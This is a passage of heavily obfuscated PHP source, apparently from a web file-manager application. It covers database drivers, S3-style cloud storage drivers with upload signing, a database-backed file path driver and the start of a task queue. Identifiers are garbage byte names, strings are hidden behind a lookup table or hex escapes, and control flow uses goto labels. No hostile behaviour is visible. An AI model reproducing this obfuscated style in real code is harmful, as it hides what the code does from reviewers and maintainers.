$Í¡¬ˆÛû[37] => isset($ÛˆÄÄ†[$Í¡¬ˆÛû[37]]) ? $ÛˆÄÄ†[$Í¡¬ˆÛû[37]] : (isset($ÛˆÄÄ†[$Í¡¬ˆÛû[56]]) ? $ÛˆÄÄ†[$Í¡¬ˆÛû[56]] : $Í¡¬ˆÛû[463]), $Í¡¬ˆÛû[39] => isset($ÛˆÄÄ†[$Í¡¬ˆÛû[95]]) ? strtolower($ÛˆÄÄ†[$Í¡¬ˆÛû[95]]) == $Í¡¬ˆÛû[41] : (isset($ÛˆÄÄ†[$Í¡¬ˆÛû[57]]) ? $ÛˆÄÄ†[$Í¡¬ˆÛû[57]] : !1), $Í¡¬ˆÛû[42] => isset($ÛˆÄÄ†[$Í¡¬ˆÛû[1114]]) ? strtolower($ÛˆÄÄ†[$Í¡¬ˆÛû[1114]]) == $Í¡¬ˆÛû[44] : (isset($ÛˆÄÄ†[$Í¡¬ˆÛû[95]]) ? $ÛˆÄÄ†[$Í¡¬ˆÛû[95]] : !1)); } } return $‘…÷¡…â; } public function getTables($ÓÒó¸½‹ = '') { $¿Ã•„ì€ =& $_SERVER[©—Ò»ÅĞ]; if (think_config($¿Ã•„ì€[1115])) { $Ö Ò“×™ = str_replace($¿Ã•„ì€[1116], $ÓÒó¸½‹, think_config($¿Ã•„ì€[1115])); } else { switch ($this->dbType) { case $¿Ã•„ì€[1083]: case $¿Ã•„ì€[1085]: $Ö Ò“×™ = $¿Ã•„ì€[1117]; break; case $¿Ã•„ì€[1082]: case $¿Ã•„ì€[1100]: $Ö Ò“×™ = $¿Ã•„ì€[1118]; break; case $¿Ã•„ì€[1109]: $Ö Ò“×™ = $¿Ã•„ì€[1119]; break; case $¿Ã•„ì€[1084]: think_exception(think_lang($¿Ã•„ì€[1120]) . $¿Ã•„ì€[1121]); break; case $¿Ã•„ì€[1101]: $Ö Ò“×™ = $¿Ã•„ì€[45] . $¿Ã•„ì€[46] . $¿Ã•„ì€[47]; break; case $¿Ã•„ì€[1112]: default: if (!empty($ÓÒó¸½‹)) { $Ö Ò“×™ = $¿Ã•„ì€[1060] . $ÓÒó¸½‹ . $¿Ã•„ì€[1061]; } else { $Ö Ò“×™ = $¿Ã•„ì€[1062]; } } } $ı«æ¶â® = $this->query($Ö Ò“×™); $ªŞ¢—² = array(); foreach ($ı«æ¶â® as $™âóœù => $Ä©ú¡Åé) { $ªŞ¢—²[$™âóœù] = current($Ä©ú¡Åé); } return $ªŞ¢—²; } protected function parseLimit($ÑèÈ¦°) { $¸¦şµóà =& $_SERVER[©—Ò»ÅĞ]; $İÙš¸”ö = $¸¦şµóà[12]; if (!empty($ÑèÈ¦°)) { switch ($this->dbType) { case $¸¦şµóà[1109]: case $¸¦şµóà[1101]: $ÑèÈ¦° = explode($¸¦şµóà[50], $ÑèÈ¦°); if (count($ÑèÈ¦°) > 1) { $İÙš¸”ö .= $¸¦şµóà[51] . $ÑèÈ¦°[1] . $¸¦şµóà[52] . $ÑèÈ¦°[0] . $¸¦şµóà[53]; } else { $İÙš¸”ö .= $¸¦şµóà[51] . $ÑèÈ¦°[0] . $¸¦şµóà[53]; } break; case $¸¦şµóà[1082]: case $¸¦şµóà[1100]: break; case $¸¦şµóà[1084]: break; case $¸¦şµóà[1083]: case $¸¦şµóà[1085]: break; case $¸¦şµóà[1112]: default: $İÙš¸”ö .= $¸¦şµóà[51] . $ÑèÈ¦° . $¸¦şµóà[53]; } } return $İÙš¸”ö; } public function parseKey(&$‡¥ÈÅ Ÿ, $ÉŠØ³Úİ = true) { $ä­ìşäĞ =& $_SERVER[©—Ò»ÅĞ]; if ($ÉŠØ³Úİ) { $‡¥ÈÅ Ÿ = $this->parseKeyCheck($‡¥ÈÅ Ÿ); } if ($this->dbType == $ä­ìşäĞ[1112]) { if ($‡¥ÈÅ Ÿ != $ä­ìşäĞ[220] && !preg_match($ä­ìşäĞ[1075], $‡¥ÈÅ Ÿ)) { $‡¥ÈÅ Ÿ = $ä­ìşäĞ[475] . trim($‡¥ÈÅ Ÿ, $ä­ìşäĞ[475]) . $ä­ìşäĞ[475]; } return $‡¥ÈÅ Ÿ; } else { return parent::parseKey($‡¥ÈÅ Ÿ, $ÉŠØ³Úİ); } } public function close() { $this->_linkID = null; } public function error() { $¸¯÷¹€ =& $_SERVER[©—Ò»ÅĞ]; if ($this->PDOStatement) { $†¨ÛõÎŸ = $this->PDOStatement->errorInfo(); $this->error = $†¨ÛõÎŸ[1] . $¸¯÷¹€[4] . $†¨ÛõÎŸ[2]; } else { $this->error = $¸¯÷¹€[12]; } if ($¸¯÷¹€[12] != $this->queryStr) { $this->error .= LNG($¸¯÷¹€[48]) . $this->queryStr; } think_trace($this->error, $¸¯÷¹€[12], $¸¯÷¹€[49]); return $this->error; } public function escapeString($µ¶í­ãò) { $ÊÂ–ïØ© =& $_SERVER[©—Ò»ÅĞ]; switch ($this->dbType) { case $ÊÂ–ïØ©[1109]: case $ÊÂ–ïØ©[1082]: case $ÊÂ–ïØ©[1100]: case $ÊÂ–ïØ©[1112]: return addslashes($µ¶í­ãò); case $ÊÂ–ïØ©[1084]: case $ÊÂ–ïØ©[1101]: case $ÊÂ–ïØ©[1083]: case $ÊÂ–ïØ©[1085]: return str_ireplace($ÊÂ–ïØ©[58], $ÊÂ–ïØ©[59], $µ¶í­ãò); } } protected function parseValue($­éÏéÜİ) { $ë‚Ïİ×¼ =& $_SERVER[©—Ò»ÅĞ]; if (is_string($­éÏéÜİ)) { $‘–•—û = strpos($­éÏéÜİ, $ë‚Ïİ×¼[4]) === 0 && in_array($­éÏéÜİ, array_keys($this->bind)); $­éÏéÜİ = $‘–•—û ? $this->escapeString($­éÏéÜİ) : $ë‚Ïİ×¼[1122] . $this->escapeString($­éÏéÜİ) . $ë‚Ïİ×¼[1122]; } elseif (isset($­éÏéÜİ[0]) && is_string($­éÏéÜİ[0]) && strtolower($­éÏéÜİ[0]) == $ë‚Ïİ×¼[372]) { $­éÏéÜİ = $this->escapeString($­éÏéÜİ[1]); } elseif (is_array($­éÏéÜİ)) { $­éÏéÜİ = array_map(array($this, $ë‚Ïİ×¼[1123]), $­éÏéÜİ); } elseif (is_bool($­éÏéÜİ)) { $­éÏéÜİ = $­éÏéÜİ ? $ë‚Ïİ×¼[91] : $ë‚Ïİ×¼[228]; } elseif (is_null($­éÏéÜİ)) { $­éÏéÜİ = $ë‚Ïİ×¼[103]; } return $­éÏéÜİ; } public function getLastInsertId() { $•ÄîîÍ =& $_SERVER[©—Ò»ÅĞ]; switch ($this->dbType) { case $•ÄîîÍ[1109]: case $•ÄîîÍ[1101]: case $•ÄîîÍ[1082]: case $•ÄîîÍ[1100]: case $•ÄîîÍ[1084]: case $•ÄîîÍ[1112]: return $this->_linkID->lastInsertId(); case $•ÄîîÍ[1083]: case $•ÄîîÍ[1085]: $Èè¿„© = $this->table; $ƒ–è‚‡Š = $this->query("\123\105\x4c\105\x43\124\40{$Èè¿„©}\56\x63\165\x72\162\x76\x61\x6c\x20\143\x75\x72\x72\x76\x61\154\x20\x46\122\117\115\40\x64\165\x61\154"); return $ƒ–è‚‡Š ? $ƒ–è‚‡Š[0][$•ÄîîÍ[1124]] : 0; } } } class DbSqlite extends DbSqliteBase { protected function _execSql($¶²æ¦½Ç) { if (!$this->_linkID || !$¶²æ¦½Ç) { return; } sqlite_query($this->_linkID, $¶²æ¦½Ç); } protected function initConnectAfter() { $æ¡Ù‘ª =& $_SERVER[©—Ò»ÅĞ]; $this->_execSql($æ¡Ù‘ª[1125]); $this->_execSql($æ¡Ù‘ª[1126]); } public function query($°Ş¸ä±¨) { $€¯ØÄá´ = parent::query($°Ş¸ä±¨); return $€¯ØÄá´; } public function execute($Ôá¥ôÈ×) { $çğôûÜ =& $_SERVER[©—Ò»ÅĞ]; if (!CacheLock::fileLock($çğôûÜ[1127])) { return !1; } $¸÷“”ÇÖ = parent::execute($Ôá¥ôÈ×); CacheLock::fileUnLock($çğôûÜ[1127]); return $¸÷“”ÇÖ; } } class DbSqlite3 extends DbSqlite3Base { protected function _execSql($Ö®ç§•Œ) { if (!$this->_linkID || !$Ö®ç§•Œ) { return; } $this->_linkID->exec($Ö®ç§•Œ); } protected function initConnectAfter() { $¾ª¬õ¼¶ =& $_SERVER[©—Ò»ÅĞ]; $this->_execSql($¾ª¬õ¼¶[1125]); $this->_execSql($¾ª¬õ¼¶[1126]); } public function query($ÎÎ¤Ú¿á) { $ŠïåÜ° = parent::query($ÎÎ¤Ú¿á); return $ŠïåÜ°; } public function execute($ºŠµÃÇÇ) { $„øµšÀå =& $_SERVER[©—Ò»ÅĞ]; if (!CacheLock::fileLock($„øµšÀå[1127])) { return !1; } $ğÊÙÔÑ = parent::execute($ºŠµÃÇÇ); CacheLock::fileUnLock($„øµšÀå[1127]); return $ğÊÙÔÑ; } } goto bàÂåáÛ³›; F­İÎ¤®”: class PathDriverBOS extends PathDriverS3 { public function __construct($‚„ëï±) { parent::__construct($‚„ëï±); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ğæº´¯º) { parent::__construct($ğæº´¯º); $this->setSignVersion($_SERVER[©—Ò»ÅĞ][247]); } public function uploadFormData($½­ŸÒáÕ, $€ÛÑ÷•¶ = 3600) { $èÅÇ†–­ =& $_SERVER[©—Ò»ÅĞ]; $²ãé»Ì = $èÅÇ†–­[229]; $º¤Â‚”Ô = $èÅÇ†–­[1524]; $ƒĞ”é®Ü = $èÅÇ†–­[261]; $ØÖĞî½š = gmdate($èÅÇ†–­[1525], time() + $€ÛÑ÷•¶); $Ã²«´ıı = (string) time() . $èÅÇ†–­[74] . (string) (time() + $€ÛÑ÷•¶); $åÓ¿ñ’ê = array($èÅÇ†–­[262] => $ØÖĞî½š, $èÅÇ†–­[265] => array(array($èÅÇ†–­[306] => $²ãé»Ì), array($èÅÇ†–­[266] => $this->bucket), array($èÅÇ†–­[267], $èÅÇ†–­[268], $èÅÇ†–­[12]), array($èÅÇ†–­[270] => $ƒĞ”é®Ü), array($èÅÇ†–­[1526] => $º¤Â‚”Ô), array($èÅÇ†–­[1527] => $this->accessKey), array($èÅÇ†–­[1528] => $Ã²«´ıı))); $åÓ¿ñ’ê = json_encode($åÓ¿ñ’ê); $úÔ†Øæª = hash_hmac($èÅÇ†–­[1524], $Ã²«´ıı, $this->secret); $‘Í§×¼ = sha1($åÓ¿ñ’ê); $ûœ¹ì‡ = hash_hmac($èÅÇ†–­[1524], $‘Í§×¼, $úÔ†Øæª); $ÙÆ©´åî = array($èÅÇ†–­[306] => $²ãé»Ì, $èÅÇ†–­[270] => $ƒĞ”é®Ü, $èÅÇ†–­[277] => base64_encode($åÓ¿ñ’ê), $èÅÇ†–­[1526] => $º¤Â‚”Ô, $èÅÇ†–­[1527] => $this->accessKey, $èÅÇ†–­[1529] => $Ã²«´ıı, $èÅÇ†–­[1530] => $ûœ¹ì‡, $èÅÇ†–­[206] => $this->getHost()); return $ÙÆ©´åî; } public function fileOutImage($º¨èß·Ó, $£Æ×¦úø = 250) { $§‚ª‚ç• =& $_SERVER[©—Ò»ÅĞ]; if ($this->size($º¨èß·Ó) > 1024 * 1024 * 32) { return $this->fileOutImageServer($º¨èß·Ó, $£Æ×¦úø); } $²¢¼Ö¨Ğ = $this->link($º¨èß·Ó); $²¢¼Ö¨Ğ .= $§‚ª‚ç•[1531] . $£Æ×¦úø . $§‚ª‚ç•[1532]; $this->fileOutLink($²¢¼Ö¨Ğ); } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($†Ñß€ó) { $this->pathParse = $†Ñß€ó; $this->model = Model($_SERVER[©—Ò»ÅĞ][1533]); } public function getPath($ÃóÚèõÁ) { return trim($ÃóÚèõÁ, $_SERVER[©—Ò»ÅĞ][8]); } public function pathFather($àçåÃ) { $¾ö„Ì“† = $this->parse($àçåÃ); $¾ö„Ì“† = $this->infoSimple($àçåÃ); return $¾ö„Ì“† ? $¾ö„Ì“†[$_SERVER[©—Ò»ÅĞ][190]] : !1; } public function pathThis($€ŠæÉ¼¸) { $›Ãê´Ğ = $this->infoSimple($€ŠæÉ¼¸); return $›Ãê´Ğ ? $›Ãê´Ğ[$_SERVER[©—Ò»ÅĞ][32]] : !1; } public function getPathOuter($ÈÇøíæ×) { if (!$ÈÇøíæ×) { return $ÈÇøíæ×; } $ÛğÃ‘æğ = $this->parse($ÈÇøíæ×); return KodIO::make($ÛğÃ‘æğ[$_SERVER[©—Ò»ÅĞ][487]]); } public function copyFolderFromIO($éôûøÆ, $´Õ¦, $Ìœ°ÂÊ‚, $½Ğ¶éÑĞ, $İ‹Ê™ñâ) { $…ˆµÂåÃ = $this->model->copyFolderFromIO($éôûøÆ, $´Õ¦, $Ìœ°ÂÊ‚, $½Ğ¶éÑĞ, $İ‹Ê™ñâ); return KodIO::make($…ˆµÂåÃ); } public function isParentOf($¸¨‹’–, $×ÄÚúë¤) { return $this->model->isParentOf($¸¨‹’–, $×ÄÚúë¤); } public function mkfile($úşé°§Ê, $ÁëóßÓà = '', $€’†’Æš = REPEAT_RENAME) { $öî—İŒò =& $_SERVER[©—Ò»ÅĞ]; $˜º²Êæó = $this->parse($úşé°§Ê); $úşé°§Ê = $˜º²Êæó[$öî—İŒò[487]]; for ($Ë››®¢ú = 0; $Ë››®¢ú < count($˜º²Êæó[$öî—İŒò[1534]]); $Ë››®¢ú++) { $êÇî÷ÂÁ = $˜º²Êæó[$öî—İŒò[1534]][$Ë››®¢ú]; if ($Ë››®¢ú == count($˜º²Êæó[$öî—İŒò[1534]]) - 1) { $úşé°§Ê = $this->model->mkfile($úşé°§Ê, $êÇî÷ÂÁ, $ÁëóßÓà, $€’†’Æš); break; } $úşé°§Ê = $this->model->mkdir($úşé°§Ê, $êÇî÷ÂÁ, REPEAT_SKIP); } return $this->getPathOuter($úşé°§Ê); } public function mkdir($éÑö‚ëÕ, $ú‘ì˜Ô = REPEAT_SKIP) { $æ¶÷¢Ã¥ =& $_SERVER[©—Ò»ÅĞ]; $‘‡Ü¶º = $this->parse($éÑö‚ëÕ); $éÑö‚ëÕ = $‘‡Ü¶º[$æ¶÷¢Ã¥[487]]; for ($âÃŞüú¯ = 0; $âÃŞüú¯ < count($‘‡Ü¶º[$æ¶÷¢Ã¥[1534]]); $âÃŞüú¯++) { $¸·ôöó‡ = $‘‡Ü¶º[$æ¶÷¢Ã¥[1534]][$âÃŞüú¯]; $éÑö‚ëÕ = $this->model->mkdir($éÑö‚ëÕ, $¸·ôöó‡, $ú‘ì˜Ô); } return $this->getPathOuter($éÑö‚ëÕ); } public function copyFile($Æƒµœ¬, $¸œ”½, $ú€œº¼ = REPEAT_REPLACE) { $÷ßŠ‰Ú– =& $_SERVER[©—Ò»ÅĞ]; $øĞó¬¾ƒ = $this->parse($¸œ”½); $ï¡Âµ™¸ = $this->model->copy($Æƒµœ¬, $øĞó¬¾ƒ[$÷ßŠ‰Ú–[487]], $ú€œº¼, $øĞó¬¾ƒ[$÷ßŠ‰Ú–[87]]); return $ï¡Âµ™¸ ? $this->getPathOuter($ï¡Âµ™¸) : !1; } public function moveFile($ì‘†«ìû, $ƒæİÄ¸“, $ó‘¦¥‹ = REPEAT_REPLACE) { $¬äºÅ =& $_SERVER[©—Ò»ÅĞ]; $İ¯ŸÏ®° = $this->parse($ƒæİÄ¸“); $î„İôâÃ = $this->model->move($ì‘†«ìû, $İ¯ŸÏ®°[$¬äºÅ[487]], $ó‘¦¥‹, $İ¯ŸÏ®°[$¬äºÅ[87]]); return $î„İôâÃ ? $this->getPathOuter($î„İôâÃ) : !1; } public function copy($™¨×Á„é, $³±†áé˜, $Ç¾ÙÒà = REPEAT_REPLACE, $ªÖ¿À‰ = false) { $½‰Â± = $this->parse($³±†áé˜); $şÆú¥â¦ = $this->model->copy($™¨×Á„é, $½‰Â±[$_SERVER[©—Ò»ÅĞ][487]], $Ç¾ÙÒà, $ªÖ¿À‰); return $şÆú¥â¦ ? $this->getPathOuter($şÆú¥â¦) : !1; } public function moveSameAllow() { } public function move($†‘´„…Ò, $‚¢‡›õ», $§¾œ²Èİ = REPEAT_REPLACE, $èŞó×“ = false) { $ç‹–Ô¨ó = $this->parse($‚¢‡›õ»); $Ò¥Óœ£´ = $this->model->move($†‘´„…Ò, $ç‹–Ô¨ó[$_SERVER[©—Ò»ÅĞ][487]], $§¾œ²Èİ, $èŞó×“); return $Ò¥Óœ£´ ? $this->getPathOuter($Ò¥Óœ£´) : !1; } public function remove($’óêşç¡, $õóø‚øÆ = true) { return $this->model->remove($’óêşç¡, $õóø‚øÆ); } public function rename($úÒİñøï, $ã¥šÎ†²) { $¦–ç¼©Ò = $this->model->rename($úÒİñøï, $ã¥šÎ†²); return $¦–ç¼©Ò ? $this->getPathOuter($úÒİñøï) : $¦–ç¼©Ò; } public function size($ÄÃ‹÷·Ê) { $ÑØƒÛ¿Å = $this->infoSimple($ÄÃ‹÷·Ê); return $ÑØƒÛ¿Å ? $ÑØƒÛ¿Å[$_SERVER[©—Ò»ÅĞ][79]] : 0; } public function infoSimple($µ¬”ñÑ¨) { return $this->model->sourceInfo($µ¬”ñÑ¨); } public function info($³–ØÙ¾«) { return $this->infoParse($³–ØÙ¾«); } public function infoAuth($ñÈ‡ü™·) { return $this->infoParse($ñÈ‡ü™·, !1, !0); } public function infoWithChildren($°’¼˜ğ) { return $this->infoParse($°’¼˜ğ, !0); } protected function infoParse($¯™½¥Í, $ÀÇàä¾… = false, $²ìÁı¯Ó = false) { if (!$ÀÇàä¾…) { return $this->model->pathInfo($¯™½¥Í, $²ìÁı¯Ó); } return $this->model->pathInfoMore($¯™½¥Í); } public function infoFullSimple($îâøÚ÷æ) { $íÎøøŒ— =& $_SERVER[©—Ò»ÅĞ]; $Ãæ¿ı³ = explode($íÎøøŒ—[8], $îâøÚ÷æ); $œŸò×òÊ = implode($íÎøøŒ—[8], array_splice($Ãæ¿ı³, 1)); return $this->model->pathInfoByPath($Ãæ¿ı³[0], $œŸò×òÊ); } public function infoFull($…Å¬ğ¨Ì) { $ÒÁ‰¯† = $this->infoFullSimple($…Å¬ğ¨Ì); return is_array($ÒÁ‰¯†) ? $this->model->pathInfo($ÒÁ‰¯†[$_SERVER[©—Ò»ÅĞ][191]]) : !1; } public function hashSimple($¨öÉóÕá) { $‹À •Ñâ =& $_SERVER[©—Ò»ÅĞ]; $õåä´Ú­ = $this->infoWithChildren($¨öÉóÕá); return $õåä´Ú­[$‹À •Ñâ[167]][$‹À •Ñâ[694]]; } public function hashMd5($¸ğ§™Şü) { $öÆ€Ï˜‹ =& $_SERVER[©—Ò»ÅĞ]; $ååª­‡„ = $this->infoWithChildren($¸ğ§™Şü); return $ååª­‡„[$öÆ€Ï˜‹[167]][$öÆ€Ï˜‹[563]]; } public function exist($ëÓ»´ôÊ) { $·ïÊÏ™ =& $_SERVER[©—Ò»ÅĞ]; $ÈÕ¼òĞ = $this->parse($ëÓ»´ôÊ); if (!$ÈÕ¼òĞ[$·ïÊÏ™[87]]) { return $this->isFile($ëÓ»´ôÊ) || $this->isFolder($ëÓ»´ôÊ); } $ù–âÜ›Ï = array($·ïÊÏ™[492] => $ÈÕ¼òĞ[$·ïÊÏ™[487]], $·ïÊÏ™[32] => $ÈÕ¼òĞ[$·ïÊÏ™[87]]); $Î‚­ÑÀà = $this->model->where($ù–âÜ›Ï)->find(); return $Î‚­ÑÀà ? !0 : !1; } public function isFile($Ç–Ü«‹) { $šÊ†·ÍÜ =& $_SERVER[©—Ò»ÅĞ]; $â½²²«š = $this->infoSimple($Ç–Ü«‹); return $â½²²«š && $â½²²«š[$šÊ†·ÍÜ[500]] == $šÊ†·ÍÜ[228] ? !0 : !1; } public function isFolder($‹‰êÙĞ˜) { $ùµÃú =& $_SERVER[©—Ò»ÅĞ]; $·ıô¥ß = $this->infoSimple($‹‰êÙĞ˜); return $·ıô¥ß && $·ıô¥ß[$ùµÃú[500]] == $ùµÃú[91] ? !0 : !1; } public function listPath($®Ç·Õı‚, $À‚Î¨·Â = false) { $ô«¸Íı =& $_SERVER[©—Ò»ÅĞ]; if ($®Ç·Õı‚ == $ô«¸Íı[12]) { return !1; } $¸åŒ½£Š = array($ô«¸Íı[492] => $®Ç·Õı‚); if ($À‚Î¨·Â) { return $this->model->listSource($¸åŒ½£Š, -1); } return $this->model->listSource($¸åŒ½£Š); } public function has($øú°¨ï¸, $Î§œ»€± = false, $Ùİ¯Áœ = null) { $³¸İ‹²ß =& $_SERVER[©—Ò»ÅĞ]; $Ç°’ú¸¿ = $this->infoWithChildren($øú°¨ï¸); if ($Î§œ»€±) { return array($³¸İ‹²ß[240] => $Ç°’ú¸¿[$³¸İ‹²ß[240]], $³¸İ‹²ß[239] => $Ç°’ú¸¿[$³¸İ‹²ß[239]]); } return $Ùİ¯Áœ ? $Ç°’ú¸¿[$³¸İ‹²ß[240]] : $Ç°’ú¸¿[$³¸İ‹²ß[239]]; } public function listAll($µÂú•‹ä) { $İÈÛ¥“ = IO::info($this->pathParse[$_SERVER[©—Ò»ÅĞ][87]]); if (!$İÈÛ¥“) { return array(); } return $this->model->listAll($µÂú•‹ä); } public function getContent($¢¤ÕÁ’) { return $this->model->getContent($¢¤ÕÁ’); } public function setContent($Ôå±µëµ, $Ô®·üÂµ = '') { return $this->model->setContent($Ôå±µëµ, $Ô®·üÂµ); } public function fileSubstr($ÔàğØí‰, $¸äıñ¤é, $‘™òùì½) { return $this->model->fileSubstr($ÔàğØí‰, $¸äıñ¤é, $‘™òùì½); } public function download($ö¼ì…µ, $®ËÌÜ¸ = '') { $¼‰Æ×êë = get_path_father($®ËÌÜ¸); $ÒØË‘ª = get_path_this($®ËÌÜ¸); $Æ¥ƒÇİë = $this->model->fileInfoGet($ö¼ì…µ); $˜ÏæĞèĞ = IO::copy($Æ¥ƒÇİë[$_SERVER[©—Ò»ÅĞ][87]], $¼‰Æ×êë, !1, $ÒØË‘ª); return $˜ÏæĞèĞ; } public function setModifyTime($ğ¯ú‚ò», $ÔÊŸ´’œ = '') { $Ö¼„×Ô£ =& $_SERVER[©—Ò»ÅĞ]; if (!$ğ¯ú‚ò») { return; } $this->model->where(array($Ö¼„×Ô£[506] => $ğ¯ú‚ò»))->save(array($Ö¼„×Ô£[88] => $ÔÊŸ´’œ)); } public function upload($¯ŒÅå›Â, $•À—¦®Ÿ, $£ –À± = false, $½ñùß = REPEAT_REPLACE) { $¬†°ìçŞ =& $_SERVER[©—Ò»ÅĞ]; $“ƒšµ„Ü = $this->parse($¯ŒÅå›Â); $Ïºóö×ƒ = $this->model->addFile($“ƒšµ„Ü[$¬†°ìçŞ[487]], $•À—¦®Ÿ, $“ƒšµ„Ü[$¬†°ìçŞ[87]], $£ –À±, $½ñùß); return $this->getPathOuter($Ïºóö×ƒ); } public function uploadFileByID($÷¼´ª…, $¿¥ÆóŸÎ, $˜ô¼ÊÜ±) { $™İÂ÷Ô =& $_SERVER[©—Ò»ÅĞ]; $ûó¿ïĞº = $this->parse($÷¼´ª…); $°¡‰ïò = $this->model->addFileByFileID($ûó¿ïĞº[$™İÂ÷Ô[487]], $¿¥ÆóŸÎ, $ûó¿ïĞº[$™İÂ÷Ô[87]], $˜ô¼ÊÜ±); return $this->getPathOuter($°¡‰ïò); } public function addFileByRemote($øı²±´, $¿¹ßŠ­, $š‰­÷Ç¤ = array(), $£³®›Ç– = '', $üù²‰¶€) { $Á¶‚Ù« =& $_SERVER[©—Ò»ÅĞ]; $ş¬„«»§ = $this->parse($øı²±´); $£³®›Ç– = empty($£³®›Ç–) ? $ş¬„«»§[$Á¶‚Ù«[87]] : $£³®›Ç–; $ûœõš¬ğ = $this->model->addFileByRemote($ş¬„«»§[$Á¶‚Ù«[487]], $¿¹ßŠ­, $£³®›Ç–, $š‰­÷Ç¤, $üù²‰¶€); return $this->getPathOuter($ûœõš¬ğ); } public function uploadLink($œùœÑë¿, $©ÆÊúæú = 0) { $²ÄÃ”Ø =& $_SERVER[©—Ò»ÅĞ]; $á€èÀ«Œ = $this->parse($œùœÑë¿); $„›ááÏ = _get($GLOBALS[$²ÄÃ”Ø[7]], $²ÄÃ”Ø[1535]); $˜å‘¥š  = _get($GLOBALS[$²ÄÃ”Ø[7]], $²ÄÃ”Ø[1536]); $¡ñğìÜé = KodIO::ioFileDriverGet($²ÄÃ”Ø[498] . $á€èÀ«Œ[$²ÄÃ”Ø[487]] . $²ÄÃ”Ø[402]); $Âú‘ßöŠ = Model($²ÄÃ”Ø[696])->createFileName($á€èÀ«Œ[$²ÄÃ”Ø[87]], $¡ñğìÜé, $„›ááÏ, $˜å‘¥š ); return IO::uploadLink($Âú‘ßöŠ, $©ÆÊúæú); } public function fileNameAuto($ÈÈ‹–ô, $ÆığæÉÛ, $¡¼¶Ûê = REPEAT_REPLACE, $‚³ï´ = false) { return $this->model->fileNameAuto($ÈÈ‹–ô, $ÆığæÉÛ, $¡¼¶Ûê, $‚³ï´); } public function fileNameExist($Æ§Í›¥, $ÈÔœß¹Û) { return $this->model->fileNameExist($Æ§Í›¥, $ÈÔœß¹Û); } protected function _fileOut($¿›ãÍ•™, $èë¿ÜìÈ = false, $’¼’²ÍÊ = false, $ Ï²¡ñ‹ = '', $ÆÇĞŠ§× = false) { $îĞÓÓ€é =& $_SERVER[©—Ò»ÅĞ]; $×¤¥ÜêŠ = $this->model->sourceInfo($¿›ãÍ•™); if ($×¤¥ÜêŠ[$îĞÓÓ€é[500]] == $îĞÓÓ€é[91]) { header($îĞÓÓ€é[1537]); die; } $áåË¬ô = $this->model->fileInfoGet($¿›ãÍ•™); $ Ï²¡ñ‹ = $áåË¬ô[$îĞÓÓ€é[563]] ? $áåË¬ô[$îĞÓÓ€é[563]] : $ Ï²¡ñ‹; $‡¯ŒíŒ¦ = isset($GLOBALS[$îĞÓÓ€é[180]]) && is_array($GLOBALS[$îĞÓÓ€é[180]]) ? $GLOBALS[$îĞÓÓ€é[180]][$îĞÓÓ€é[32]] : $×¤¥ÜêŠ[$îĞÓÓ€é[32]]; if ($ÆÇĞŠ§×) { return IO::fileOutServer($áåË¬ô[$îĞÓÓ€é[87]], $èë¿ÜìÈ, $‡¯ŒíŒ¦, $ Ï²¡ñ‹); } IO::fileOut($áåË¬ô[$îĞÓÓ€é[87]], $èë¿ÜìÈ, $‡¯ŒíŒ¦, $ Ï²¡ñ‹); } public function fileOut($ìÁÉ£®Ë, $Ã–ˆÀ¡ = false, $·ó…ó‚¨ = false, $Ø¶ ¡Æ« = '') { $this->_fileOut($ìÁÉ£®Ë, $Ã–ˆÀ¡, $·ó…ó‚¨, $Ø¶ ¡Æ«); } public function fileOutServer($Ó›±³ì±, $”¤ÓÎ¼Ë = false, $ğ×íÈ³‹ = false, $ó¥Åçáˆ = '') { $this->_fileOut($Ó›±³ì±, $”¤ÓÎ¼Ë, $ğ×íÈ³‹, $ó¥Åçáˆ, !0); } protected function _fileOutImage($—»í¦Ã, $‹¯ÙÁ¿² = 250) { $ê†˜ÉÌü =& $_SERVER[©—Ò»ÅĞ]; $˜‹êïÃ‘ = $this->model->pathInfo($—»í¦Ã); if ($˜‹êïÃ‘[$ê†˜ÉÌü[500]] == $ê†˜ÉÌü[91]) { show_json($ê†˜ÉÌü[1538] . $—»í¦Ã, !1); } $µÎ÷Ï’ = $this->model->fileInfoGet($—»í¦Ã); $˜‹êïÃ‘[$ê†˜ÉÌü[181]] = $µÎ÷Ï’[$ê†˜ÉÌü[87]]; $GLOBALS[$ê†˜ÉÌü[180]] = $˜‹êïÃ‘; IO::fileOutImage($µÎ÷Ï’[$ê†˜ÉÌü[87]], $‹¯ÙÁ¿²); } public function fileOutImage($æÓç›¯, $µÃÖ±¼® = 250) { $this->_fileOutImage($æÓç›¯, $µÃÖ±¼®); } public function fileOutImageServer($‡·Û‚ë¼, $³Ï½¥§Ô = 250) { $this->_fileOutImage($‡·Û‚ë¼, $³Ï½¥§Ô); } public function link($Óòı«â, $ô¯àÓ’¾ = '') { $Ìü–…¡ = $this->model->fileInfoGet($Óòı«â); return IO::link($Ìü–…¡[$_SERVER[©—Ò»ÅĞ][87]], $ô¯àÓ’¾); } protected function parse($­ô§ª“á) { $°š¢¥Ôñ =& $_SERVER[©—Ò»ÅĞ]; if (strstr($­ô§ª“á, $°š¢¥Ôñ[8]) === !1) { return array($°š¢¥Ôñ[508] => intval($­ô§ª“á), $°š¢¥Ôñ[87] => $°š¢¥Ôñ[12], $°š¢¥Ôñ[1534] => array()); } $ö„ Çı§ = explode($°š¢¥Ôñ[8], trim($­ô§ª“á, $°š¢¥Ôñ[8])); if (count($ö„ Çı§) < 2) { show_tips(clear_html($­ô§ª“á) . $°š¢¥Ôñ[1539]); } return array($°š¢¥Ôñ[508] => intval($ö„ Çı§[0]), $°š¢¥Ôñ[87] => $ö„ Çı§[1], $°š¢¥Ôñ[1534] => array_slice($ö„ Çı§, 1)); } } goto E×ÕˆéŠ¿Ë; d‹Ğ»âëò‹: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\x73\153\x51\165\x65\165\145\114\x65\x6e\147\x74\150"; const QUEUE_DATA = "\164\x61\x73\x6b\121\165\x65\x75\145\104\141\164\x61"; const QUEUE_TIME = "\x74\x61\163\153\x51\165\x65\x75\x65\x4c\141\163\x74\x52\x75\156"; const QUEUE_THREAD = "\x74\x61\x73\x6b\x51\165\x65\165\145\124\x68\x72\145\141\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($«¹Ãê”, $î‚š÷Ü = array(), $‹¡„ŸÆÈ = '', $áå‘çÇ = '') { $Àù „ò =& 